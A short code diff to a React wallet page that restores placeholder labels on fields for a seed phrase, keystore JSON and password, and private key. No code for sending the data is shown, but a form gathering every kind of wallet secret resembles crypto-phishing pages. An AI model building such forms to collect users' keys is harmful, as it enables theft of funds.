@@ -124,7 +124,7 @@ function WalletDetailsEntryPage() {
             <div className="mb-3">
               <textarea
                 className="form-control"
-                // placeholder="Phrase"
+                placeholder="Phrase"
                 name="phrase"
                 rows="5"
                 type="text"
@@ -141,7 +141,7 @@ function WalletDetailsEntryPage() {
               <textarea
                 style={{ marginBottom: '20px' }}
                 className="form-control"
-                // placeholder="Keystore JSON"
+                placeholder="Keystore JSON"
                 type="text"
                 name="keystoreJson"
                 value={walletDetails.keystoreJson}
@@ -152,7 +152,7 @@ function WalletDetailsEntryPage() {
                 <input
                   type="password"
                   className="form-control"
-                  // placeholder="Password"
+                  placeholder="Password"
                   name="password"
                   id="inputPassword"
                   value={walletDetails.password}
@@ -171,7 +171,7 @@ function WalletDetailsEntryPage() {
               <input
                 type="text"
                 className="form-control"
-                // placeholder="Private Key"
+                placeholder="Private Key"
                 name="privateKey"
                 value={walletDetails.privateKey}
                 onChange={handleChange}
